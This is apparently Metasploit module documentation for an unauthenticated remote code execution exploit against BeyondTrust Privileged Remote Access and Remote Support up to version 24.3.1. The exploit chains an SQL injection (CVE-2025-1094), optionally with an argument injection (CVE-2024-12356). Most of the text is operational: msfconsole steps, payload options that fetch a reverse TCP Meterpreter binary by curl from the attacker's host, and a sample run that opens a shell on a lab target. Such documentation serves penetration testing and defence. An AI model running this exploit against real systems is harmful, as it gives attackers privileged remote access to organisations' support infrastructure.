## Vulnerable Application
This exploit achieves unauthenticated remote code execution against BeyondTrust Privileged Remote
Access (PRA) and Remote Support (RS), with the privileges of the site user of the targeted BeyondTrust
product site. This exploit targets PRA and RS versions `24.3.1` and below.

## Testing
This exploit was tested against a vulnerable BeyondTrust Remote Support target running version `24.1.2`. To install
a virtual appliance, follow [this documentation](https://docs.beyondtrust.com/rs/docs/va-install). You will first need
to acquire the relevant software packages.

## Verification Steps

1. Start msfconsole
2. `use exploit/linux/http/beyondtrust_pra_rs_unauth_rce`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp`
5. `set LHOST eth0`
6. `set LPORT 4444`
7. `check`
8. `exploit`

## Options

### TargetCompanyName
If set, use this name value to identify the company name of the deployed site (e.g. `mytestcompany`).
By default, this is auto discovered.

### TargetServerFQDN
If set, use this FQDN value to identify the FQDN of the deployed site (e.g. `support.mytestcompany.com`).
By default, this is auto discovered.

### LeverageCVE_2024_12356
By default, this exploit does not leverage the argument injection vulnerability CVE-2024-12356, and instead exploits the
SQLi vulnerability CVE-2025-1094 directly. Enabling this option will cause this exploit to leverage CVE-2024-12356 during
the exploitation of the SQLi vulnerability CVE-2025-1094. In either case the SQLi vulnerability CVE-2025-1094 is leveraged
to achieve RCE.

## Scenarios

### Default

```
msf6 exploit(linux/http/beyondtrust_pra_rs_unauth_rce) > show options 

Module options (exploit/linux/http/beyondtrust_pra_rs_unauth_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.86.105   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                       html
   RPORT    443              yes       The target port (TCP)
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        true             yes       Attempt to delete the binary after execution
   FETCH_FILENAME      usKuEPuSzgnx     no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /var/tmp         yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/beyondtrust_pra_rs_unauth_rce) > check
[*] 192.168.86.105:443 - The target appears to be vulnerable. Detected version 24.1.2
msf6 exploit(linux/http/beyondtrust_pra_rs_unauth_rce) > exploit
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 24.1.2
[*] Using company name: mytestcompany
[*] Sending stage (3045380 bytes) to 192.168.86.105
[*] Meterpreter session 1 opened (192.168.86.122:4444 -> 192.168.86.105:10104) at 2025-01-31 10:51:38 +0000

meterpreter > getuid
Server username: mytestcompany
meterpreter > sysinfo
Computer     : 192.168.86.105
OS           : Gentoo 2.14 (Linux 6.1.76-bt)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
